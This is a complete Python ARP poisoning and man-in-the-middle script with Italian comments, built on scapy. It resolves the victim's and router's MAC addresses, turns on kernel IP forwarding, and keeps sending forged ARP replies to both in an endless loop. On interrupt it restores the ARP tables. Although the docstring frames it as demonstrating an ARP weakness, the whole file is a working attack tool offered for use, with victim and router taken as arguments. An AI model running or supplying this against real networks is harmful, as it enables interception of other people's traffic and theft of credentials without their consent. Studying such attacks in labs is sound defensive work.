#!/usr/bin/env python3

"""
ARP Poisoning & MITM Tool
-------------------------
Questo script dimostra una vulnerabilità del protocollo ARP inviando risposte
ARP non sollecitate (ARP Spoofing) per intercettare il traffico tra due nodi.
"""

import scapy.all as scapy
import time
import argparse
import sys
import os

def get_mac(ip):
    """
    Risolve l'indirizzo MAC di un IP target tramite richieste ARP broadcast.
    Implementa retry multipli per gestire l'instabilità della rete.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Invio richiesta ARP in broadcast e attesa risposta (retry=3 per affidabilità)
    answered_list = scapy.srp(broadcast/arp_request, timeout=2, verbose=False, retry=3)[0]
    
    # Verifica che il target abbia risposto prima di accedere ai dati
    if not answered_list:
        return None
    return answered_list[0][1].hwsrc

def toggle_forwarding(state):
    """
    Abilita o disabilita l'IP Forwarding a livello di kernel Linux.
    Necessario per permettere ai pacchetti della vittima di transitare attraverso 
    l'attaccante verso il router senza interrompere la connessione (MITM).
    """
    path = "/proc/sys/net/ipv4/ip_forward"
    if not os.path.exists(path):
        print(f"[!] Errore: Path {path} non trovato. Script compatibile solo con Linux.")
        return

    val = "1" if state else "0"
    try:
        with open(path, "w") as f:
            f.write(val)
    except PermissionError:
        print("\n[!] Errore: Permessi insufficienti. Eseguire con sudo.")
    except Exception as e:
        print(f"\n[!] Errore critico IP Forwarding: {e}")

def spoof(target_ip, spoof_ip, target_mac):
    """
    Invia un pacchetto ARP 'is-at' (op=2) falsificato.
    Dichiara al 'target_ip' che l'IP 'spoof_ip' è associato al MAC dell'attaccante.
    Viene usato il Layer 2 (Ethernet) per inviare il pacchetto in Unicast.
    """
    # hwdst è il MAC fisico della vittima, psrc è l'IP che vogliamo impersonare
    packet = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.sendp(packet, verbose=False)

def restore_network(v_ip, v_mac, r_ip, r_mac):
    """
    Invia pacchetti ARP corretti per ripristinare le tabelle ARP originali.
    Viene eseguito alla chiusura dello script per non lasciare la rete instabile.
    """
    print(f"\r[*] Ripristino ARP: {v_ip} <-> {r_ip}...")
    
    # Comunichiamo alla vittima il vero MAC del router
    p1 = scapy.Ether(dst=v_mac) / scapy.ARP(op=2, pdst=v_ip, hwdst=v_mac, psrc=r_ip, hwsrc=r_mac)
    
    # Comunichiamo al router il vero MAC della vittima
    p2 = scapy.Ether(dst=r_mac) / scapy.ARP(op=2, pdst=r_ip, hwdst=r_mac, psrc=v_ip, hwsrc=v_mac)
    
    # Invio multiplo (count=5) per assicurarsi che l'aggiornamento venga recepito
    scapy.sendp([p1, p2], count=5, verbose=False)

if __name__ == "__main__":
    # Gestione argomenti da riga di comando per rendere il tool flessibile
    parser = argparse.ArgumentParser(description="Professional ARP Poisoning Toolkit")
    parser.add_argument("-v", "--victim", required=True, help="Indirizzo IP della vittima")
    parser.add_argument("-r", "--router", required=True, help="Indirizzo IP del gateway/router")
    args = parser.parse_args()

    try:
        # Fase 1: Discovery degli indirizzi MAC reali
        print("[*] Inizializzazione Discovery...")
        v_mac, r_mac = get_mac(args.victim), get_mac(args.router)
        
        if not v_mac or not r_mac:
            sys.exit("[!] Errore critico: Impossibile risolvere i MAC address. Verifica gli IP.")

        # Fase 2: Configurazione sistema e inizio attacco
        toggle_forwarding(True)
        print(f"[*] MITM Attivo tra {args.victim} e {args.router}")
        
        # Fase 3: Ciclo infinito di invio pacchetti spoofati (mantenimento avvelenamento)
        while True:
            spoof(args.victim, args.router, v_mac) # Inganniamo la vittima
            spoof(args.router, args.victim, r_mac) # Inganniamo il router
            time.sleep(2)

    except KeyboardInterrupt:
        # Fase 4: Gestione uscita sicura con pulizia della rete
        print("\n[!] Interruzione rilevata. Avvio ripristino...")
        restore_network(args.victim, v_mac, args.router, r_mac)
        toggle_forwarding(False)
        print("[+] Rete ripristinata correttamente.")